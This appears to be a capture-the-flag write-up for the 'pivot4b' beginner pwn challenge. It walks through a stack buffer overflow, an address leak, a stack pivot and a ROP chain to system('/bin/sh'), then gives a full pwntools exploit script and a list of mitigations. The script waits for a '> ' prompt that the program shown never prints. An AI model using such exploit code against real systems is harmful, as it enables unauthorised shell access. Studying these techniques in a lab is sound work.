# pivot4b - SECCON 2025 beginners pwn

## Challenge Overview

- **Category**: pwn
- **Difficulty**: Beginner
- **Points**: TBD
- **Challenge Description**: A stack pivot challenge teaching buffer overflow exploitation with ROP chain techniques

## Source Code Analysis

### Key Components

The challenge consists of a simple C program with the following key functions:

```c
// Gift functions providing useful gadgets
void gift_set_first_arg() {
    asm volatile("pop %rdi");  // pop rdi gadget at 0x40117a
    asm volatile("ret");
}

void gift_call_system() {
    system("echo \"Here's your gift!\"");  // system call at 0x40118d
}

// Main vulnerable function
int main() {
    char message[0x30];  // 48-byte buffer
    printf("Here's the pointer to message: %p\n", message);  // Address leak
    read(0, message, sizeof(message) + 0x10);  // Reads 64 bytes - 16 byte overflow!
    printf("Message: %s\n", message);
    return 0;
}
```

### Vulnerability Analysis

1. **Buffer Overflow**: The `message` buffer is 48 bytes (`0x30`), but `read()` accepts up to 64 bytes (`0x30 + 0x10`), creating a 16-byte overflow that overwrites the saved RBP and return address.

2. **Information Disclosure**: The program leaks the stack address of the `message` buffer, enabling precise calculation of target addresses.

3. **ROP Gadgets**: The gift functions provide useful gadgets:
   - `0x40117a`: `pop rdi; ret` - sets up function arguments
   - `0x40118d`: `system()` function call

### Memory Layout

```
High Address
┌─────────────────┐
│   Saved RIP     │ ← Overwrite with leave_ret (0x401211)
├─────────────────┤
│   Saved RBP     │ ← Overwrite with fake RBP (message-8)  
├─────────────────┤ ← RBP
│                 │
│   message[0x30] │ ← 48-byte buffer (leaked address)
│                 │
├─────────────────┤ ← RSP, message pointer
Low Address
```

## Security Analysis

### Binary Protections

```bash
$ checksec chall
[*] '/path/to/chall'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found      ← Allows buffer overflow
    NX:         NX enabled           ← Prevents shellcode execution
    PIE:        No PIE (0x400000)    ← Fixed addresses
    Stripped:   No                   ← Function symbols available
```

**Key Security Implications:**
- **No Stack Canary**: Buffer overflow detection disabled
- **NX Enabled**: Code execution on stack prevented, requires ROP
- **No PIE**: Predictable addresses for gadgets and functions
- **Partial RELRO**: Some protection but GOT is partially writable

## Exploitation Strategy

### Attack Vector

The exploitation uses a **stack pivot** technique:

1. **Information Leak**: Use the leaked buffer address to calculate payload locations
2. **ROP Chain Construction**: Build a ROP chain in the buffer to call `system("/bin/sh")`
3. **Stack Pivot**: Use `leave; ret` gadget to pivot execution to the buffer
4. **Shell Execution**: Execute the ROP chain to gain shell access

### Stack Pivot Mechanism

The `leave` instruction performs:
```asm
mov rsp, rbp    ; Move stack pointer to base pointer  
pop rbp         ; Restore base pointer from stack
```

By controlling RBP (through buffer overflow) and using `leave; ret`, we redirect execution to our ROP chain stored in the buffer.

## Exploit Implementation

### Payload Structure (64 bytes total)

```python
# ROP chain stored in message buffer
payload  = p64(pop_rdi)           # 0x40117a - pop rdi; ret
payload += p64(binsh_addr)        # Address of "/bin/sh" string  
payload += p64(ret)               # 0x40101a - stack alignment
payload += p64(system)            # 0x40118d - system() function
payload += b"/bin/sh\x00"         # The command string
payload += cyclic(0x8)            # Padding to fill buffer
payload += p64(message - 8)       # Fake RBP for stack pivot
payload += p64(leave_ret)         # 0x401211 - leave; ret gadget
```

### Exploitation Flow

1. **Receive leaked address**: Parse the leaked message buffer pointer
2. **Calculate target addresses**: 
   - `binsh_addr = message + 0x20` (location of "/bin/sh" in buffer)
3. **Send payload**: Overflow buffer with ROP chain and pivot gadget
4. **Stack pivot execution**:
   - Return to `leave; ret` (0x401211)
   - Stack pivots to message buffer 
   - Execute ROP chain: `pop rdi <binsh_addr>; ret; system`
   - System executes `/bin/sh` for shell access

### Working Exploit Code

```python
from pwn import *

p = process('./chall')
e = ELF('./chall')

# Get leaked buffer address
p.recvuntil(b'message: ')
message = int(p.recvline().strip(), 16)
print(f"message buffer at: {hex(message)}")

# Gadget addresses
pop_rdi = 0x40117a      # pop rdi; ret
system = 0x40118d       # system() function
leave_ret = 0x401211    # leave; ret gadget  
ret = 0x40101a          # ret gadget for alignment

# Calculate /bin/sh location in buffer
binsh_addr = message + 0x20

# Construct ROP chain payload
payload = p64(pop_rdi)           # Set up RDI register
payload += p64(binsh_addr)       # "/bin/sh" string address
payload += p64(ret)              # Stack alignment
payload += p64(system)           # system() function call
payload += b"/bin/sh\x00"        # Command string
payload += cyclic(0x8)           # Buffer padding  
payload += p64(message - 8)      # Fake RBP
payload += p64(leave_ret)        # Pivot gadget

p.sendafter(b'> ', payload)
p.interactive()
```

## Educational Takeaways

### Key Learning Points

1. **Stack Pivot Technique**: Learn how to redirect execution when buffer space is limited by pivoting the stack to a controlled memory region.

2. **Information Disclosure Exploitation**: Understand how address leaks enable precise exploitation in non-ASLR environments.

3. **ROP Chain Construction**: Practice building Return-Oriented Programming chains to bypass NX protection.

4. **x64 Calling Conventions**: Learn how function arguments are passed via registers (RDI for first argument in System V ABI).

5. **Buffer Overflow Fundamentals**: Understand how insufficient bounds checking leads to memory corruption vulnerabilities.

### Defensive Mitigations

This attack would be prevented by:

- **Stack Canaries**: Detect buffer overflows before return address overwrite
- **ASLR/PIE**: Randomize addresses to make ROP gadgets unpredictable  
- **Control Flow Integrity (CFI)**: Restrict indirect jumps to legitimate targets
- **Input Validation**: Proper bounds checking on user input
- **Stack Protection**: Modern compilers enable stack protection by default

### Debugging Techniques Used

- **Static Analysis**: Source code review and binary analysis with objdump
- **Dynamic Analysis**: GDB debugging for gadget verification
- **Protection Analysis**: checksec for security feature enumeration
- **Address Calculation**: Precise payload construction using leaked addresses
